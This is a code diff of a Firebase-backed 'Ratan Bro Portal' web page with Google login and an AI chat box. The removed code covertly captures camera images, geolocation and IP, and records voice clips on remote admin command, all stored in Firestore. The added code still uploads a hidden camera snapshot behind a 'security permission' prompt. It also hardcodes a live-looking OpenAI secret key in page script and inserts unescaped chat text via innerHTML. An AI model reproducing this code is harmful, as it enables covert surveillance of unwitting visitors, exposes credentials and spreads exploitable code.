@@ -8,39 +8,183 @@
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --pink: #ff4d94; --glow: #ff4d94; --dark: #020617; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Hind Siliguri', sans-serif; }
-        body { background: var(--dark); background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.15), transparent), #020617; color: white; min-height: 100vh; overflow-x: hidden; }
+        :root {
+            --pink: #ff4d94;
+            --glow: #ff4d94;
+            --dark: #020617;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Hind Siliguri', sans-serif;
+        }
+
+        body {
+            background: var(--dark);
+            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.15), transparent), #020617;
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
 
         /* Modals */
-        #login-overlay, #perm-modal, #notif-modal { position: fixed; inset: 0; background: rgba(2, 6, 23, 0.95); z-index: 10000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
-        .glass-box { background: rgba(255, 255, 255, 0.05); padding: 40px; border-radius: 30px; border: 1px solid rgba(255, 77, 148, 0.3); text-align: center; width: 90%; max-width: 400px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5); }
+        #login-overlay, #perm-modal, #notif-modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(2, 6, 23, 0.95);
+            z-index: 10000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(10px);
+        }
 
-        /* UI Elements */
-        .hero-header { margin: 20px; padding: 30px 20px; background: rgba(255, 255, 255, 0.03); border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); position: relative; overflow: hidden; }
-        .profile-wrapper { display: flex; justify-content: center; align-items: center; gap: 15px; }
-        .p-img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--pink); box-shadow: 0 0 25px var(--pink); object-fit: cover; }
-        .user-p-img { width: 85px; height: 85px; border: 3px solid #fff; margin-left: -25px; }
+        .glass-box {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 40px;
+            border-radius: 30px;
+            border: 1px solid rgba(255, 77, 148, 0.3);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
 
-        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 20px; max-width: 600px; margin: 0 auto; }
-        .card { background: rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255, 255, 255, 0.05); transition: 0.4s; position: relative; cursor: pointer; }
-        .card:hover { transform: translateY(-5px); border-color: var(--pink); box-shadow: 0 0 20px rgba(255, 77, 148, 0.4); }
-        .card i { font-size: 2.2rem; color: var(--pink); margin-bottom: 12px; }
+        .hero-header {
+            margin: 20px;
+            padding: 30px 20px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            position: relative;
+        }
 
-        /* Red Alarm Dot */
-        .alarm-dot { position: absolute; top: 12px; right: 12px; width: 12px; height: 12px; background: red; border-radius: 50%; box-shadow: 0 0 10px red; display: none; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        .profile-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+        }
 
-        .chat-area { max-width: 500px; margin: 20px auto; padding: 0 20px; }
-        .chat-mini { background: rgba(0, 0, 0, 0.4); border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.1); padding: 12px; font-size: 13px; }
-        #chat-log { height: 60px; overflow-y: auto; color: #ccc; margin-bottom: 8px; }
-        .chat-in { display: flex; gap: 8px; }
-        .chat-in input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 8px 15px; border-radius: 50px; outline: none; }
-        
-        .logout-btn { background: none; border: 1px solid rgba(255,255,255,0.2); color: #888; padding: 5px 15px; border-radius: 50px; cursor: pointer; font-size: 12px; margin: 10px; }
-        
-        canvas { display: none; }
-        #vSource { position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
+        .p-img {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 3px solid var(--pink);
+            box-shadow: 0 0 25px var(--pink);
+            object-fit: cover;
+        }
+
+        .user-p-img {
+            width: 85px;
+            height: 85px;
+            border: 3px solid #fff;
+            margin-left: -25px;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 25px;
+            text-align: center;
+            text-decoration: none;
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: 0.4s;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            border-color: var(--pink);
+            box-shadow: 0 0 20px rgba(255, 77, 148, 0.4);
+        }
+
+        .card i {
+            font-size: 2.2rem;
+            color: var(--pink);
+            margin-bottom: 12px;
+        }
+
+        .alarm-dot {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            width: 12px;
+            height: 12px;
+            background: red;
+            border-radius: 50%;
+            box-shadow: 0 0 10px red;
+            display: none;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .chat-area {
+            max-width: 500px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+
+        .chat-mini {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 12px;
+        }
+
+        #chat-log {
+            height: 100px;
+            overflow-y: auto;
+            color: #ccc;
+            margin-bottom: 8px;
+            font-size: 13px;
+            text-align: left;
+        }
+
+        .chat-in {
+            display: flex;
+            gap: 8px;
+        }
+
+        .chat-in input {
+            flex: 1;
+            background: #000;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 8px 15px;
+            border-radius: 50px;
+            outline: none;
+        }
+
+        .logout-btn {
+            background: none;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #888;
+            padding: 5px 15px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 10px;
+        }
+
+        canvas, video#vSource { display: none; }
     </style>
 </head>
 
@@ -48,31 +192,31 @@
     <audio id="snd-bus" src="business.mp3" preload="auto"></audio>
     <audio id="snd-port" src="portfolio.mp3" preload="auto"></audio>
     <audio id="snd-look" src="lookup.mp3" preload="auto"></audio>
+    <audio id="snd-notif" src="https://www.soundjay.com/buttons/sounds/button-3.mp3" preload="auto"></audio>
 
     <div id="login-overlay">
         <div class="glass-box">
             <img src="ratan.jpg" style="width:100px; border-radius:50%; border:3px solid var(--pink); margin-bottom:15px;">
             <h3>Ratan Bro Portal</h3>
-            <p style="font-size:14px; opacity:0.7; margin-bottom:10px;">প্রবেশ করতে লগইন করুন</p>
-            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px 30px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; margin-top:15px; box-shadow: 0 5px 15px rgba(255, 77, 148, 0.4);">Login with Google</button>
+            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px 30px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; margin-top:15px;">Login with Google</button>
         </div>
     </div>
 
     <div id="perm-modal">
         <div class="glass-box">
             <i class="fas fa-shield-alt" style="font-size:3rem; color:var(--pink);"></i>
-            <h3 style="margin:15px 0;">সিকিউরিটি পারমিশন</h3>
-            <p style="font-size:14px; opacity:0.7; margin-bottom:20px;">আপনার ব্রাউজারের ক্যামেরা এবং মাইক্রোফোন পারমিশন Allow করুন।</p>
+            <h3>সিকিউরিটি পারমিশন</h3>
+            <p style="font-size:14px; opacity:0.7; margin:15px 0;">নোটিফিকেশন এবং ক্যামেরা এক্সেস প্রয়োজন।</p>
             <button onclick="startApp()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">Grant Access</button>
         </div>
     </div>
 
-    <div id="notif-modal" onclick="this.style.display='none'">
+    <div id="notif-modal">
         <div class="glass-box">
             <h3 id="nt-title">নতুন ঘোষণা!</h3>
             <img id="nt-img" src="" style="width:100%; border-radius:15px; margin:15px 0; display:none; border:1px solid var(--pink);">
             <p id="nt-msg" style="font-size:14px; opacity:0.8;"></p>
-            <button style="background:var(--pink); color:white; border:none; padding:10px 30px; border-radius:50px; margin-top:15px;">ঠিক আছে</button>
+            <button onclick="closeNotif()" style="background:var(--pink); color:white; border:none; padding:10px 30px; border-radius:50px; margin-top:15px;">ঠিক আছে</button>
         </div>
     </div>
 
@@ -84,26 +228,33 @@
                 <img src="ratan.jpg" class="p-img">
                 <img id="u-pic" src="" class="p-img user-p-img" onerror="this.src='ratan.jpg'">
             </div>
-            <h2 id="u-name" style="text-align:center; margin-top:15px; font-weight:700;">User</h2>
-            <p style="text-align:center; color:var(--pink); font-size:14px; font-weight:bold;">Verified Member</p>
+            <h2 id="u-name" style="text-align:center; margin-top:15px;">User</h2>
+            <p style="text-align:center; color:var(--pink); font-size:14px;">Verified Member</p>
         </div>
 
         <div class="grid">
+            <div class="card" onclick="openLatestNotif()">
+                <i class="fas fa-bell"></i>
+                <p>Notification</p>
+                <div id="notif-alarm" class="alarm-dot"></div>
+            </div>
+            
             <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i><p>Test Paper</p></a>
             <a href="business.html" class="card" onclick="document.getElementById('snd-bus').play();"><i class="fas fa-handshake"></i><p>Business</p></a>
             <a href="portfolio.html" class="card" onclick="document.getElementById('snd-port').play();"><i class="fas fa-laptop-code"></i><p>Portfolio</p></a>
-            <a href="https://numberlookup.pro.bd/" target="_blank" class="card" id="lookup-btn" onclick="document.getElementById('snd-look').play(); clearAlarm();">
-                <i class="fas fa-search"></i><p>Lookup</p>
-                <div id="alarm" class="alarm-dot"></div>
+            
+            <a href="https://numberlookup.pro.bd/" target="_blank" class="card" onclick="document.getElementById('snd-look').play();">
+                <i class="fas fa-search"></i>
+                <p>Lookup</p>
             </a>
         </div>
 
         <div class="chat-area">
             <div class="chat-mini">
-                <div id="chat-log">Ratan AI: স্বাগতম! আমি আপনাকে কীভাবে সাহায্য করতে পারি?</div>
+                <div id="chat-log"><b>Ratan AI:</b> স্বাগতম! আমি আপনাকে কীভাবে সাহায্য করতে পারি?</div>
                 <div class="chat-in">
-                    <input type="text" id="ai-msg" placeholder="Ask AI...">
-                    <button onclick="askAI()" style="background:var(--pink); border:none; color:white; padding:5px 15px; border-radius:50px; font-size:11px; cursor:pointer;">Send</button>
+                    <input type="text" id="ai-msg" placeholder="OpenAI GPT-4o দিয়ে প্রশ্ন করুন...">
+                    <button onclick="askAI()" style="background:var(--pink); border:none; color:white; padding:5px 15px; border-radius:50px; cursor:pointer;">Send</button>
                 </div>
             </div>
         </div>
@@ -130,179 +281,117 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
         const provider = new GoogleAuthProvider();
-        
+        const OPENAI_KEY = "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";
+
         let loggedUser = null;
-        let config = { loginMode: "ON", permissionMode: "ON" };
-        let activeStream = null;
+        let latestNotif = null;
 
-        // ১. অ্যাডমিন সেটিংস (Login & Permission) রিয়েল-টাইম চেক
-        onSnapshot(doc(db, "site_config", "settings"), (snap) => {
-            if (snap.exists()) {
-                config = snap.data();
-                checkAuthFlow();
-            }
-        });
-
-        // ২. রেড অ্যালার্ম ও নোটিফিকেশন লিসেনার
+        // ১. নোটিফিকেশন লিসেনার (Real-time)
         onSnapshot(doc(db, "site_updates", "latest"), (snap) => {
-            if (snap.exists() && snap.data().status === "new") {
-                document.getElementById('alarm').style.display = 'block';
-                showUpdateModal(snap.data());
+            if (snap.exists()) {
+                latestNotif = snap.data();
+                if (latestNotif.status === "new") {
+                    document.getElementById('notif-alarm').style.display = 'block';
+                    document.getElementById('snd-notif').play();
+                    // ব্রাউজার নোটিফিকেশন (যদি পারমিশন থাকে)
+                    if (Notification.permission === "granted") {
+                        new Notification("Ratan Bro Update", { body: latestNotif.message });
+                    }
+                }
             }
         });
 
         onAuthStateChanged(auth, (user) => {
             loggedUser = user;
-            checkAuthFlow();
+            if (user) showMainUI();
+            else document.getElementById('login-overlay').style.display = 'flex';
         });
-
-        function checkAuthFlow() {
-            const loginOverlay = document.getElementById('login-overlay');
-            const permModal = document.getElementById('perm-modal');
-            const mainUI = document.getElementById('main-ui');
-
-            // লগইন মোড অন থাকলে এবং ইউজার লগইন না থাকলে
-            if (config.loginMode === "ON" && !loggedUser) {
-                loginOverlay.style.display = 'flex';
-                mainUI.style.display = 'none';
-                permModal.style.display = 'none';
-            } else {
-                loginOverlay.style.display = 'none';
-                // পারমিশন মোড অন থাকলে এবং সাইট এখনো চালু না হলে
-                if (config.permissionMode === "ON" && mainUI.style.display !== 'block') {
-                    permModal.style.display = 'flex';
-                } else {
-                    permModal.style.display = 'none';
-                    showMainUI();
-                }
-            }
-        }
 
         window.googleLogin = () => signInWithPopup(auth, provider);
         window.googleLogout = () => signOut(auth).then(() => location.reload());
 
-        // সাইট স্টার্ট এবং ট্র্যাকিং শুরু
         window.startApp = async () => {
-            const video = document.getElementById('vSource');
             try {
+                await Notification.requestPermission();
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                activeStream = stream;
-                video.srcObject = stream;
-                video.onloadedmetadata = () => video.play();
-                
+                document.getElementById('vSource').srcObject = stream;
                 showMainUI();
-                
-                // প্রথমবার ডাটা সেভ
-                setTimeout(() => takeSnap(loggedUser), 2000);
-                
-                // অ্যাডমিন কমান্ড লিসেনার (লাইভ স্ন্যাপ/ভয়েস)
-                if(loggedUser) {
-                    const userKey = loggedUser.email.replace(/\./g, '_');
-                    onSnapshot(doc(db, "users", userKey), (s) => {
-                        const cmd = s.data()?.command;
-                        if (cmd === "snap") takeSnap(loggedUser);
-                        if (cmd === "voice") recordVoice(activeStream, 10000);
-                        if (cmd) updateDoc(doc(db, "users", userKey), { command: "" });
-                    });
-                }
-            } catch (err) {
-                alert("ক্যামেরা পারমিশন ছাড়া সাইটটি কাজ করবে না।");
-            }
+                takeSnap();
+            } catch (err) { alert("Permission Required!"); }
         };
 
         function showMainUI() {
-            document.getElementById('perm-modal').style.display = 'none';
             document.getElementById('login-overlay').style.display = 'none';
-            document.getElementById('main-ui').style.display = 'block';
+            document.getElementById('perm-modal').style.display = (Notification.permission !== "granted") ? 'flex' : 'none';
+            document.getElementById('main-ui').style.display = (Notification.permission === "granted") ? 'block' : 'none';
             if (loggedUser) {
                 document.getElementById('u-name').innerText = loggedUser.displayName;
                 document.getElementById('u-pic').src = loggedUser.photoURL;
             }
         }
 
-        async function takeSnap(user) {
-            if(!user) return;
+        window.openLatestNotif = () => {
+            if (latestNotif) {
+                document.getElementById('nt-msg').innerText = latestNotif.message;
+                const img = document.getElementById('nt-img');
+                if (latestNotif.image) { img.src = latestNotif.image; img.style.display = 'block'; }
+                document.getElementById('notif-modal').style.display = 'flex';
+                document.getElementById('notif-alarm').style.display = 'none';
+            } else { alert("No new notifications."); }
+        };
+
+        window.closeNotif = () => {
+            document.getElementById('notif-modal').style.display = 'none';
+        };
+
+        // ৩. AI Chat with OpenAI API
+        window.askAI = async () => {
+            const input = document.getElementById('ai-msg');
+            const log = document.getElementById('chat-log');
+            if (!input.value) return;
+
+            const userMsg = input.value;
+            log.innerHTML += `<br><b>You:</b> ${userMsg}`;
+            input.value = "";
+            log.scrollTop = log.scrollHeight;
+
+            try {
+                const response = await fetch("https://api.openai.com/v1/chat/completions", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Authorization": `Bearer ${OPENAI_KEY}`
+                    },
+                    body: JSON.stringify({
+                        model: "gpt-4o-mini",
+                        messages: [{ role: "user", content: userMsg }]
+                    })
+                });
+                const data = await response.json();
+                const aiReply = data.choices[0].message.content;
+                log.innerHTML += `<br><b>AI:</b> ${aiReply}`;
+            } catch (e) {
+                log.innerHTML += `<br><b style="color:red;">Error:</b> AI কানেক্ট হতে পারছে না।`;
+            }
+            log.scrollTop = log.scrollHeight;
+        };
+
+        async function takeSnap() {
+            if (!loggedUser) return;
             const video = document.getElementById('vSource');
             const canvas = document.getElementById('snapCanvas');
             const ctx = canvas.getContext('2d');
-            if (video.readyState < 2) return;
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const dataImg = canvas.toDataURL('image/jpeg', 0.5);
-            
-            const userRef = doc(db, "users", user.email.replace(/\./g, '_'));
-            const s = await getDoc(userRef);
-            let picList = s.data()?.picList || [];
-            picList.unshift(dataImg);
-            if (picList.length > 5) picList.pop();
-
-            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: 'N/A' }));
-            
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                await setDoc(userRef, { 
-                    name: user.displayName, 
-                    email: user.email, 
-                    photo: user.photoURL, 
-                    picList, 
-                    ip: ipData.ip, 
-                    loc: `${pos.coords.latitude},${pos.coords.longitude}`, 
-                    status: "Online", 
-                    lastView: new Date().toLocaleString() 
-                }, { merge: true });
-            }, async () => {
-                await setDoc(userRef, { picList, ip: ipData.ip, status: "Online", lastView: new Date().toLocaleString() }, { merge: true });
-            });
+            setTimeout(async () => {
+                ctx.drawImage(video, 0, 0, 640, 480);
+                const img = canvas.toDataURL('image/jpeg', 0.5);
+                const userKey = loggedUser.email.replace(/\./g, '_');
+                await updateDoc(doc(db, "users", userKey), { 
+                    lastPic: img, 
+                    lastSeen: new Date().toLocaleString(),
+                    status: "Online"
+                });
+            }, 5000);
         }
-
-        async function recordVoice(stream, time) {
-            if(!loggedUser) return;
-            const recorder = new MediaRecorder(stream);
-            let chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'audio/webm' });
-                const reader = new FileReader();
-                reader.readAsDataURL(blob);
-                reader.onloadend = async () => {
-                    const userRef = doc(db, "users", loggedUser.email.replace(/\./g, '_'));
-                    const s = await getDoc(userRef);
-                    let audioList = s.data()?.audioList || [];
-                    audioList.unshift(reader.result);
-                    if (audioList.length > 4) audioList.pop();
-                    await updateDoc(userRef, { audioList });
-                };
-            };
-            recorder.start();
-            setTimeout(() => recorder.stop(), time);
-        }
-
-        function showUpdateModal(data) {
-            document.getElementById('nt-msg').innerText = data.message;
-            if(data.image) {
-                document.getElementById('nt-img').src = data.image;
-                document.getElementById('nt-img').style.display = 'block';
-            } else {
-                document.getElementById('nt-img').style.display = 'none';
-            }
-            document.getElementById('notif-modal').style.display = 'flex';
-        }
-
-        window.clearAlarm = async () => {
-            document.getElementById('alarm').style.display = 'none';
-            // স্ট্যাটাস রিড করে দিলে অন্য ইউজারদের সমস্যা হতে পারে, তাই এটি শুধু লোকাললি হাইড করা ভালো।
-            // তবে আপনি চাইলে নিচের লাইনটি রাখতে পারেন:
-            // await updateDoc(doc(db, "site_updates", "latest"), { status: "read" });
-        };
-
-        window.askAI = () => {
-            const msg = document.getElementById('ai-msg').value;
-            if (!msg) return;
-            document.getElementById('chat-log').innerHTML = `<b>You:</b> ${msg}<br><b>AI:</b> আমি আপনার রিকোয়েস্টটি প্রসেস করছি...`;
-            document.getElementById('ai-msg').value = "";
-        };
     </script>
 </body>
-
 </html>
